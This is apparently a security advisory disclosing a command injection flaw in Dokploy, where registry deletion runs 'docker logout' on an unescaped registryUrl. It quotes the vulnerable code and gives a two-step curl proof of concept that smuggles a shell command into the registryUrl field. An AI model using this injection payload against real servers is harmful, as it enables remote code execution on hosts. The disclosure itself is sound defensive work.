repo.description:
### Summary

The `deleteRegistry` function in Dokploy (`packages/server/src/services/registry.ts`) executes `docker logout ${response.registryUrl}` without shell escaping. In the same file, the `docker login` command correctly uses `shEscape()` to prevent command injection. This inconsistency creates a command injection vulnerability when deleting a registry with a crafted `registryUrl`.

### Details

**SAFE code - docker login** ([registry.ts:24-27](https://github.com/Dokploy/dokploy/blob/ddfcd1a671a48b81545b97926047aa0cf965fcbd/packages/server/src/services/registry.ts#L24-L27)):

```typescript
const escapedRegistry = shEscape(registry);
const escapedUser = shEscape(user);
const escapedPassword = shEscape(pass);
return `printf %s ${escapedPassword} | docker login ${escapedRegistry} -u ${escapedUser} --password-stdin`;
```

**VULNERABLE code - docker logout** ([registry.ts:88](https://github.com/Dokploy/dokploy/blob/ddfcd1a671a48b81545b97926047aa0cf965fcbd/packages/server/src/services/registry.ts#L88)):

```typescript
await execAsync(`docker logout ${response.registryUrl}`);
// ^^^ NO shEscape() applied! The function exists on line 14 of the same file!
```

The `registryUrl` parameter is validated with `z.string()` only - no regex restriction on special characters. An authenticated user can set `registryUrl` to a value containing shell metacharacters (`;`, `|`, `$()`, etc.).

The `shEscape()` function is defined on line 14 of the same file but is not applied to the `docker logout` command.

### PoC

```bash
# 1. Create a registry with malicious URL
curl -X POST https://dokploy-instance/api/trpc/registry.create \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"registryName":"evil","username":"x","password":"x","registryUrl":"; id > /tmp/pwned #","registryType":"cloud","organizationId":"<org-id>"}'

# 2. Delete the registry - triggers docker logout with injected command
curl -X POST https://dokploy-instance/api/trpc/registry.remove \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"registryId":"<registry-id>"}'

# The server executes: docker logout ; id > /tmp/pwned #
# Result: RCE - 'id' command output written to /tmp/pwned
```

### Impact

1. **Remote Code Execution**: Any authenticated user with registry management permissions can execute arbitrary OS commands on the Dokploy host
2. **Server compromise**: Full control over the Dokploy server and all hosted applications
3. **Lateral movement**: Access to Docker daemon enables container escape and host compromise
repo.summary: Command Injection via incomplete shell escaping in docker logout (registry deletion)
